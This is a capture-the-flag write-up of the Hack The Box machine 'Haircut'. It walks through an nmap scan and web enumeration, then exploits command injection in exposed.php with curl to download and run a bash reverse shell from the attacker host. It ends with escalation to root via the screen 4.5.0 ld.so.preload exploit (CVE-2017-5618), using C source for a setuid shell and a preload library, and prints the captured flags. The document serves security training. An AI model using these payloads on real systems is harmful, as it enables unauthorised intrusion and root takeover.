# Target
| Category          | Details                                                                                          |
|-------------------|--------------------------------------------------------------------------------------------------|
| 📝 **Name**       | [Haircut](https://app.hackthebox.com/machines/Haircut)                                           |  
| 🏷 **Type**       | HTB Machine                                                                                      |
| 🖥 **OS**         | Linux                                                                                            |
| 🎯 **Difficulty** | Medium                                                                                           |
| 📁 **Tags**       | command injection, screen 4.5.0, [CVE-2017-5618](https://nvd.nist.gov/vuln/detail/CVE-2017-5618) |

### User flag

#### Scan target with `nmap`
```
┌──(magicrc㉿perun)-[~/attack/HTB Haircut]
└─$ nmap -sS -sC -sV -p- $TARGET    
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-01 17:50 +0100
Nmap scan report for 10.129.13.137
Host is up (0.060s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e9:75:c1:e4:b3:63:3c:93:f2:c6:18:08:36:48:ce:36 (RSA)
|   256 87:00:ab:a9:8f:6f:4b:ba:fb:c6:7a:55:a8:60:b2:68 (ECDSA)
|_  256 b6:1b:5c:a9:26:5c:dc:61:b7:75:90:6c:88:51:6e:54 (ED25519)
80/tcp open  http    nginx 1.10.0 (Ubuntu)
|_http-title:  HTB Hairdresser 
|_http-server-header: nginx/1.10.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.23 seconds
```

#### Enumerate web server
```
<SNIP>
404      GET        7l       13w      178c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET        7l       15w      144c http://10.129.13.137/index.html
200      GET      286l     1220w   226984c http://10.129.13.137/bounce.jpg
200      GET        7l       15w      144c http://10.129.13.137/
301      GET        7l       13w      194c http://10.129.13.137/uploads => http://10.129.13.137/uploads/
200      GET      646l     3555w   296820c http://10.129.13.137/carrie.jpg
200      GET        6l       15w      223c http://10.129.13.137/test.html
200      GET      459l     2660w   245772c http://10.129.13.137/sea.jpg
200      GET        7l       15w      141c http://10.129.13.137/hair.html
200      GET      286l     1220w   226984c http://10.129.13.137/uploads/bounce.jpg
200      GET       19l       41w      446c http://10.129.13.137/exposed.php
<SNIP>
```
After brief analysis we can see that `curl` command in being executed in by `exposed.php`, prior to parameter sanitization. Parameters containing `;`, `&`, `|` and `bash` (among the others) are not allowed. However, we have discovered that we could write `curl` output to given file using `-o` option and that command could be injected with ```. 

#### Start `nc` to listen for reverse shell connection
```
┌──(magicrc㉿perun)-[~/attack/HTB Haircut]
└─$ nc -u -lvnp 4444
listening on [any] 4444 ...
```

#### Host reverse shell connection spawner over HTTP
```
┌──(magicrc㉿perun)-[~/attack/HTB Haircut]
└─$ echo "/bin/bash -c 'bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1'" > reverse_shell.sh
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

#### Download and execute `reverse_shell.sh`
```
┌──(magicrc㉿perun)-[~/attack/HTB Haircut]
└─$ curl -s http://$TARGET/exposed.php -d "formurl=http://$LHOST/reverse_shell.sh -o /tmp/reverse_shell.sh" -o /dev/null && \
curl -s http://$TARGET/exposed.php -d 'formurl=http://localhost?cmd=`chmod 777 /tmp/reverse_shell.sh`' -o /dev/null && \
curl -s http://$TARGET/exposed.php -d 'formurl=http://localhost?cmd=`/tmp/reverse_shell.sh`' -o /dev/null
```

#### Confirm foothold gained
```
connect to [10.10.16.16] from (UNKNOWN) [10.129.13.137] 56376
bash: cannot set terminal process group (1234): Inappropriate ioctl for device
bash: no job control in this shell
www-data@haircut:~/html$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

#### Capture user flag
```
www-data@haircut:/$ cat /home/maria/user.txt
725b848649abee2d846dfdfaae2c04ef
```

### Root flag

#### Discover vulnerable `screen` binary
Binary has been found with `linpeas`.
```
www-data@haircut:/$ ls -la /usr/bin/screen-4.5.0
-rwsr-xr-x 1 root root 1588648 May 19  2017 /usr/bin/screen-4.5.0
www-data@haircut:/$ /usr/bin/screen-4.5.0 -v
Screen version 4.05.00 (GNU) 10-Dec-16
```

#### Prepare root shell
```
www-data@haircut:/$ { cat <<'EOF'> /tmp/rootshell.c
#include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
EOF
} && /usr/bin/gcc-5 -B/usr/bin -w -o /tmp/rootshell /tmp/rootshell.c
```

#### Prepare library for setting SUID for `/tmp/rootshell`
```
www-data@haircut:/$ { cat <<'EOF'> /tmp/lib.rootshell.c
#include <sys/types.h>
#include <unistd.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
}
EOF
} && /usr/bin/gcc-5 -B/usr/bin -w -fPIC -shared -ldl -o /tmp/lib.rootshell.so /tmp/lib.rootshell.c
```

#### Exploit [CVE-2017-5618](https://nvd.nist.gov/vuln/detail/CVE-2017-5618) to spawn root shell
```
www-data@haircut:/$ cd /etc && \
umask 000 && \
/usr/bin/screen-4.5.0 -D -m -L ld.so.preload echo -ne "\x0a/tmp/lib.rootshell.so" && \
screen -ls; \
/tmp/rootshell -p
' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
No Sockets found in /tmp/screens/S-joker.

# id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
```

#### Capture root flag
```
# cat /root/root.txt
ef1428cf75182972695378e0cc108ea8
```
